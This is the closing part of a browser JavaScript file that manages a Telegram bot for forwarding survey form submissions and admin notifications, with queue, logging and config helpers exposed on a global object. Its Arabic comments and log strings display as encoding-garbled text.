        console.log('ğŸ’¬ ØªÙ… ØªØ­Ø¯ÙŠØ« Ù…Ø¹Ø±Ù Ø§Ù„Ø¯Ø±Ø¯Ø´Ø©');
    }
    
    getConfig() {
        return {
            botToken: this.botToken ? 'â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢' : null,
            chatId: this.chatId,
            enabled: this.isEnabled,
            queueLength: this.queue.length
        };
    }
    
    clearQueue() {
        this.queue = [];
        this.saveQueue();
        console.log('ğŸ—‘ï¸ ØªÙ… Ù…Ø³Ø­ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±');
    }
    
    exportLogs() {
        try {
            const logs = JSON.parse(localStorage.getItem('telegram_logs') || '[]');
            const statistics = this.getStatistics();
            
            const data = {
                statistics: statistics,
                logs: logs,
                exportedAt: new Date().toISOString()
            };
            
            return JSON.stringify(data, null, 2);
            
        } catch (error) {
            console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØµØ¯ÙŠØ± Ø§Ù„Ø³Ø¬Ù„Ø§Øª:', error);
            return '{}';
        }
    }
}

// ====== ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù…Ø¯ÙŠØ± Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø© ======
let telegramBotManager = null;

document.addEventListener('DOMContentLoaded', function() {
    try {
        telegramBotManager = new TelegramBotManager();
        console.log('ğŸ¤– Telegram Bot Manager Ø¬Ø§Ù‡Ø² Ù„Ù„Ø¹Ù…Ù„!');
        
        // ØªØµØ¯ÙŠØ± Ø§Ù„ÙƒØ§Ø¦Ù† Ù„Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¹Ø§Ù…
        window.TelegramBot = telegramBotManager;
        
    } catch (error) {
        console.error('âŒ ÙØ´Ù„ ÙÙŠ ØªÙ‡ÙŠØ¦Ø© Telegram Bot Manager:', error);
    }
});

// ====== Ø¯Ø§Ù„Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù…Ù† main.js ======
async function sendToTelegram(formData, submissionId) {
    if (!telegramBotManager) {
        console.warn('âš ï¸ Telegram Bot Manager ØºÙŠØ± Ù…Ù‡ÙŠØ£');
        return { success: false, error: 'Ø§Ù„Ù…Ø¯ÙŠØ± ØºÙŠØ± Ù…Ù‡ÙŠØ£' };
    }
    
    try {
        const result = await telegramBotManager.sendSurveySubmission(formData, submissionId);
        
        // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ù†ØªÙŠØ¬Ø©
        telegramBotManager.logMessage('survey_submission', formData, result);
        
        return result;
        
    } catch (error) {
        console.error('âŒ Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:', error);
        return { success: false, error: error.message };
    }
}

// ====== ØªØµØ¯ÙŠØ± Ø§Ù„Ø¯ÙˆØ§Ù„ Ù„Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¹Ø§Ù… ======
window.TELEGRAM = {
    sendSurvey: sendToTelegram,
    sendNotification: (title, message, type) => 
        telegramBotManager?.sendAdminNotification(title, message, type) || Promise.resolve({ success: false }),
    testConnection: () => telegramBotManager?.testConnection() || Promise.resolve({ success: false, message: 'Ø§Ù„Ù…Ø¯ÙŠØ± ØºÙŠØ± Ù…Ù‡ÙŠØ£' }),
    getStats: () => telegramBotManager?.getStatistics() || {},
    getConfig: () => telegramBotManager?.getConfig() || {},
    updateConfig: (token, chatId, enabled) => telegramBotManager?.updateConfig(token, chatId, enabled),
    enable: () => telegramBotManager?.enable(),
    disable: () => telegramBotManager?.disable(),
    clearQueue: () => telegramBotManager?.clearQueue(),
    exportLogs: () => telegramBotManager?.exportLogs() || '{}'
};

console.log('âœ… telegram.js ØªÙ… Ø§Ù„ØªØ­Ù…ÙŠÙ„ Ø¨Ù†Ø¬Ø§Ø­!');